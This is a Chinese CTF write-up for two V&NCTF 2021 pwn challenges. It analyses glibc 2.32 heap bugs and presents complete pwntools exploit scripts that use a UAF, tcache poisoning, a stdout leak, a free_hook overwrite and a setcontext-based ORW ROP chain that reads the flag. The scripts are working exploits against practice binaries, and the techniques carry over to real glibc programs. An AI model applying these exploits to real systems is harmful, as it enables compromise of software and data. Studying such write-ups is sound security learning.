> 原文链接: https://www.anquanke.com//post/id/234604 


# 2021 V&amp;NCTF 部分PWN WriteUP


                                阅读量   
                                **101951**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t0156ef2c50e4012d55.png)](https://p3.ssl.qhimg.com/t0156ef2c50e4012d55.png)



## ff

### <a class="reference-link" name="%E5%88%86%E6%9E%90"></a>分析

首先`ida`查看一下该程序，程序一共提供了四种功能，分别是`add,delete,show,edit`四个函数，其中`show`函数只能够调用一次，`edit`函数只能调用两次。比较特殊的一个点就是该程序使用的`GLIBC 2.32`。我们首先来分析一下所有的函数，首先是`add`函数

```
__int64 add()
`{`
  __int64 result; // rax
  unsigned int i; // [rsp+8h] [rbp-18h]
  unsigned int size; // [rsp+Ch] [rbp-14h]
  void *size_4; // [rsp+10h] [rbp-10h]

  puts("Size:");
  size = myRead();
  if ( size &gt; 0x7E )
    size = 0x7F;
  size_4 = malloc(size);
  for ( i = 0; i &lt;= 0xF; ++i )
  `{`
    if ( !noteList[i] )
    `{`
      noteList[i] = size_4;
      global_index = i;
      break;
    `}`
  `}`
  result = noteList[global_index];
  if ( result )
  `{`
    puts("Content:");
    read(0, size_4, size);
    result = 0LL;
  `}`
  return result;
`}`
```

从这里可以看出，一共最多可以分配`0x10`个堆块，并且每个堆块的大小要`&lt;=0x90`，将新申请的堆块的`index`赋给了`global index`。看一下`delete`函数。

```
void del()
`{`
  free((void *)noteList[global_index]);
`}`
```

函数很简单，删除当前`global index`，并且这里没有清空列表中存储的堆块指针，也就是存在`UAF`。但是需要注意的是这里只能删除了`global index`指向的堆块。结合`add`函数来看，只能删除新申请的堆块，之前的旧的堆块无法进行删除。再来看一下`show`函数。

```
ssize_t show()
`{`
  return write(1, (const void *)noteList[global_index], 8uLL);
`}`
```

也就是输出了当前`global index`指向堆块的前`8`字节。最后看一下`edit`函数

```
ssize_t edit()
`{`
  puts("Content:");
  return read(0, (void *)noteList[global_index], 0x10uLL);
`}`
```

这里也是对`global index`指向的堆块进行`0x10`字节大小的`edit`。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8"></a>利用

从上述的函数分析来看，这里的对于堆块的操作仅仅限于当前的堆块。程序中存在一个`UAF`。

那么这里利用`UAF`我们仅仅可以泄漏出堆地址，并且这还是由于`2.32`特性的原因。其最主要的一个点就是进行了`tcache-&gt;fd`指针的加密。

```
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
```

也就是进行了抑或加密。那么这里就和其他版本的`tcache`不一样了。我们看一下释放一个堆块之后的堆块内容。

```
pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555757310 (size : 0x20cf0)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x80)   tcache_entry[6](1): 0x5555557572a0 --&gt; 0x555555757 (invaild memory)
pwndbg&gt; x/20gx  0x5555557572a0
0x5555557572a0: 0x0000000555555757      0x0000555555757010
0x5555557572b0: 0x0000000000000000      0x0000000000000000
0x5555557572c0: 0x0000000000000000      0x0000000000000000
0x5555557572d0: 0x0000000000000000      0x0000000000000000
0x5555557572e0: 0x0000000000000000      0x0000000000000000
0x5555557572f0: 0x0000000000000000      0x0000000000000000
0x555555757300: 0x0000000000000000      0x0000000000000000
0x555555757310: 0x0000000000000000      0x0000000000020cf1
0x555555757320: 0x0000000000000000      0x0000000000000000
0x555555757330: 0x0000000000000000      0x0000000000000000
pwndbg&gt;
```

也就是说如果我们此时调用`show`函数就可以泄漏出一个堆地址。那么得到这个堆地址之后就可以利用两次`edit`的机会构造`double free`，覆写`fd`指针，使得我们可以分配到`pthread_tcache_struct`结构体所在的堆块进而控制`tcache`的`count`和`entry`指针，从而实现任意的地址分配。

但是现在还存在一个问题就是如何泄漏得到`libc`基地址，上面我们已经控制了`tcache`，那么就可以将`0x290`大小堆块对应的`count`设置为`7`，进而释放`pthread_tcache_struct`结构体，那么该结构体就会被释放到`unsorted bin`中，也就是存在了一个`libc`地址。

```
pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555757310 (size : 0x20cf0)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x555555757000 (size : 0x290)
(0x30)   tcache_entry[1](251): 0
(0x40)   tcache_entry[2](255): 0
(0x70)   tcache_entry[5](251): 0
(0x80)   tcache_entry[6](255): 0x555555757 (invaild memory)
(0x290)   tcache_entry[39](7): 0
pwndbg&gt; x/20gx 0x555555757000
0x555555757000: 0x0000000000000000      0x0000000000000291
0x555555757010: 0x00007ffff7fb9c00      0x00007ffff7fb9c00
0x555555757020: 0x0000000000000000      0x0000000000000000
0x555555757030: 0x0000000000000000      0x0000000000000000
0x555555757040: 0x0000000000000000      0x0000000000000000
0x555555757050: 0x0000000000000000      0x0007000000000000
0x555555757060: 0x0000000000000000      0x0000000000000000
0x555555757070: 0x0000000000000000      0x0000000000000000
0x555555757080: 0x0000000000000000      0x0000000000000000
0x555555757090: 0x0000000000000000      0x0000000000000000
```

那么在堆块中存在改地址之后就可以再次利用任意地址分配，覆写`main_arena`附近的地址使其指向`stdout`。这个过程中由于堆块的分配导致`libc`地址向高地址方向移动，最终我选择的是在`0x60 tcache entry`位置处存储`main_arena`附近的地址，将其覆写为`stdout`再申请`0x60`大小的堆块即可覆写`stdout`结构体，泄漏出`libc`地址。这里需要`1/16`的爆破。

泄漏到`libc`地址之后就好说了，再次利用任意地址分配分配到`free_hook`，覆写其为`system`，`getshell`。

### <a class="reference-link" name="EXP"></a>EXP

```
# encoding=utf-8
from pwn import *

file_path = "./pwn"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 1
if debug:
    p = process([file_path])
    # gdb.attach(p, "b *$rebase(0xE23)")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('node3.buuoj.cn', 26212)
    libc = ELF('./libc.so.6')
    one_gadget = 0x0


def add(size, content=b"1\n"):
    p.sendlineafter("&gt;&gt;", "1")
    p.sendlineafter("Size:\n", str(size))
    p.sendafter("Content:\n", content)


def delete():
    p.sendlineafter("&gt;&gt;", "2")


def show():
    p.sendlineafter("&gt;&gt;", "3")


def edit(content):
    p.sendlineafter("&gt;&gt;", "5")
    p.sendafter("Content:\n", content)


stdout = 0xa6c0

while True:
    try:
        add(0x78)
        delete()
        show()
        heap_base = u64(p.recv(8)) &lt;&lt; 12
        log.success("heap base is `{``}`".format(hex(heap_base)))

        edit(b"\x00"*0x10)
        delete()
        enc = ((heap_base + 0x2a0) &gt;&gt; 12) ^ (heap_base + 0x10)
        edit(p64(enc) + p64(heap_base + 0x10))


        add(0x78)
        add(0x78, b"\x00"*0x48 + p64(0x0007000000000000))
        gdb.attach(p, "b *$rebase(0xE23)")
        delete()

        # gdb.attach(p, "b *$rebase(0xE23)")

        add(0x48, p16(0)*2 + p16(2) + p16(0) + p16(1) + p16(0) + p32(0) + b"\x00"*0x38)
        add(0x48, b"\x00"*0x40 + p64(heap_base + 0xb0))
        delete()

        add(0x38, p16(stdout))
        add(0x58, p64(0xfdad2887 | 0x1000) + p64(0)*3 + b"\x00")

        libc.address = u64(p.recv(8)) - 0x84 - libc.sym['_IO_2_1_stdout_']
        log.success("libc address is `{``}`".format(hex(libc.address)))
        break
    except:
        p.close()
        p = remote('node3.buuoj.cn', 26212)

add(0x48, b"\x00"*0x40 + p64(libc.sym['__free_hook'] - 0x10))
add(0x38, b"/bin/sh\x00".ljust(0x10) + p64(libc.sym['system']))
delete()

p.interactive()
```



## LittleRedFlower

### <a class="reference-link" name="%E5%88%86%E6%9E%90"></a>分析

首先用`ida`看一下。程序在一开始给出了一个`libc`地址。接着提供了一个一字节的任意写和一个`8`字节的任意写，然后根据用户输入的`size`分配了对应大小的堆块，注意的是这里的堆块大小需要满足`&gt; 0x1000 &amp; &lt; 0x2000`。读取用户的内容之后释放了此堆块。

程序开启了沙箱，只能采用`ORW`

```
root@134f60691926:~/work/2021VNCTF/LittleRedFlower# seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

### <a class="reference-link" name="%E5%88%A9%E7%94%A8"></a>利用

这里很明显是要覆写`free__hook`，但是如何覆写，或者说如何申请到该堆块。看一下`tcache`的分配过程

```
DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx &lt; mp_.tcache_bins
      &amp;&amp; tcache
      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)
    `{`
      return tcache_get (tc_idx);
    `}`
  DIAG_POP_NEEDS_COMMENT;
```

这里需要满足三个条件才可以进行`tcache_get`的调用，我们来看一下`tcache_bins`，该成员变量限制了可以放入`tcache`的堆块大小与`global_max_fast`类似。

```
pwndbg&gt; p mp_
$1 = `{`
  trim_threshold = 131072,
  top_pad = 131072,
  mmap_threshold = 131072,
  arena_test = 8,
  arena_max = 0,
  n_mmaps = 0,
  n_mmaps_max = 65536,
  max_n_mmaps = 0,
  no_dyn_threshold = 0,
  mmapped_mem = 0,
  max_mmapped_mem = 0,
  sbrk_base = 0x555555757000 "",
  tcache_bins = 64,
  tcache_max_bytes = 1032,
  tcache_count = 7,
  tcache_unsorted_limit = 0
`}`
pwndbg&gt; p &amp;mp_
$2 = (struct malloc_par *) 0x7ffff7fbb280 &lt;mp_&gt;
pwndbg&gt; x/20gx 0x7ffff7fbb280
0x7ffff7fbb280 &lt;mp_&gt;:   0x0000000000020000      0x0000000000020000
0x7ffff7fbb290 &lt;mp_+16&gt;:        0x0000000000020000      0x0000000000000008
0x7ffff7fbb2a0 &lt;mp_+32&gt;:        0x0000000000000000      0x0001000000000000
0x7ffff7fbb2b0 &lt;mp_+48&gt;:        0x0000000000000000      0x0000000000000000
0x7ffff7fbb2c0 &lt;mp_+64&gt;:        0x0000000000000000      0x0000555555757000
0x7ffff7fbb2d0 &lt;mp_+80&gt;:        0x0000000000000040      0x0000000000000408
0x7ffff7fbb2e0 &lt;mp_+96&gt;:        0x0000000000000007      0x0000000000000000
0x7ffff7fbb2f0 &lt;obstack_exit_failure&gt;:  0x0000000000000001      0x0000000001000000
0x7ffff7fbb300 &lt;__x86_raw_shared_cache_size_half&gt;:      0x0000000000800000      0x0000000001000000
0x7ffff7fbb310 &lt;__x86_shared_cache_size_half&gt;:  0x0000000000800000      0x0000000000008000
```

这里的`tcache_bins`默认是`0x40`，也就是`tcache`中堆块最大为`0x410`大小，如果我们将此成员变量改大，那么在之后我们分配`&gt;0x1000`的堆块的时候就可以从`tcache`中进行分配了。

但是这里涉及到一个`count`和`entry`的问题。首先来看`count`，由于之前没有堆块的释放，因此整个`pthread_tcache_struct`全部为`0`，只能看程序一开始的`0x200`堆块，因为该堆块全部被`memset`为了`\x01`，这里正好可以作为`tcache`的`count`。

那么利用之后的`8`字节任意写在对应的位置写入`free_hook`的值就可以直接分配到`free_hook`了。这里我选择的大小为`0x1510`。

到此可以覆写`free_hook`了，但是程序开启了沙箱，只能利用`setcontext`进行一下迁移栈地址了，我是将栈地址迁移到了`free_hook`附近，并在此处布置了`orw rop`。这里的详细内容可以看一下SROP。

### <a class="reference-link" name="EXP"></a>EXP

```
# encoding=utf-8
from pwn import *

file_path = "./pwn"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 1
if debug:
    p = process([file_path])
    gdb.attach(p, "b *$rebase(0xc60)\nb *$rebase(0xF2a)\n b malloc\nb free")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe6b93, 0xe6b96, 0xe6b99, 0x10af39]

else:
    p = remote('node3.buuoj.cn', 29649)
    libc = ELF('./libc.so.6')
    one_gadget = [0xe6b93, 0xe6b96, 0xe6b99, 0x10af39]


p.recvuntil("GIFT: ")
libc.address = int(p.recvline().strip(), 16) - libc.sym['_IO_2_1_stdout_']
log.success("libc address is `{``}`".format(hex(libc.address)))

mp_address = libc.sym['obstack_exit_failure'] - 0x70
p.sendafter("byte anywhere\n", p64(mp_address + 0x51))
p.sendafter("what?", "\x02")


p_rsi_r = 0x000000000002709c + libc.address
p_rdi_r = 0x0000000000026bb2 + libc.address
p_rdx_r12_r = 0x000000000011c3b1 + libc.address
p_rax_r = 0x0000000000028ff4 + libc.address
syscall = 0x0000000000066199 + libc.address
leave_r = 0x000000000005a9a8 + libc.address
ret = 0x00000000000bffbb + libc.address

flag_str_address = libc.sym['__free_hook'] + 0x28
flag_address = libc.sym['__free_hook'] + 0x30
setcontext = libc.sym['setcontext'] + 61
frame_address = libc.sym['__free_hook']
orw_address = libc.sym['__free_hook'] + 0xb0
magic_gadget = 0x0000000000154b20 + libc.address

orw = flat([
    p_rdi_r, flag_str_address,
    p_rsi_r, 0,
    p_rax_r, 2,
    syscall,
    p_rdi_r, 3,
    p_rsi_r, flag_address,
    p_rdx_r12_r, 0x30, 0,
    p_rax_r, 0,
    syscall,
    p_rdi_r, 1,
    p_rsi_r, flag_address,
    p_rdx_r12_r, 0x30, 0,
    p_rax_r, 1,
    syscall
])

log.success("mp_ address is `{``}`".format(hex(mp_address)))
p.sendlineafter("Offset:\n", str(0x868))
p.sendafter("Content:\n", p64(libc.sym['__free_hook']))

p.sendlineafter("size:\n", str(0x1500))

payload = p64(magic_gadget) + p64(frame_address)
payload += p64(0)*2 + p64(setcontext) + b"flag\x00".ljust(8, b"\x00")
payload += b"\x00"*0x70 + p64(orw_address) + p64(ret)
payload += orw

p.sendlineafter("&gt;&gt;", payload)

p.interactive()
```
